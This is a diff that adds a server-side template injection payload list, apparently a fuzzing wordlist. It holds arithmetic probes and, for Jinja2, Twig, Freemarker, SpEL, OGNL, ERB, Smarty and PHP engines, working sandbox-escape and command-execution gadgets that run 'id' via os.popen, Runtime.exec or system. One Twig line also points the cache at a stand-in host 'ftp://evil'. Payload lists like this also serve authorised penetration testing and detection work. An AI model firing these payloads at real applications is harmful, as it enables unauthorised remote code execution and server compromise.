@@ -1,0 +1,36 @@
+# Server-Side Template Injection Payloads
+# Targets: expression probes, template directives, sandbox escape chains, and RCE gadgets
+
+# === Arithmetic Probes ===
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+*{7*7}
+~{7*7}
+
+# === Jinja2 / Twig / Python Gadgets ===
+{{config.__class__.__init__.__globals__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{_self.env.registerUndefinedFilterCallback('system')}}
+
+# === Java / Freemarker / SpEL / OGNL ===
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${@java.lang.Runtime@getRuntime()}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+#set($x="freemarker.template.utility.Execute")
+${''.getClass().forName('java.lang.Runtime')}
+
+# === ERB / Smarty / PHP ===
+<%= system('id') %>
+<%= IO.popen('id').read %>
+{php}system('id');{/php}
+{system('id')}
+{{_self.env.setCache("ftp://evil")}}
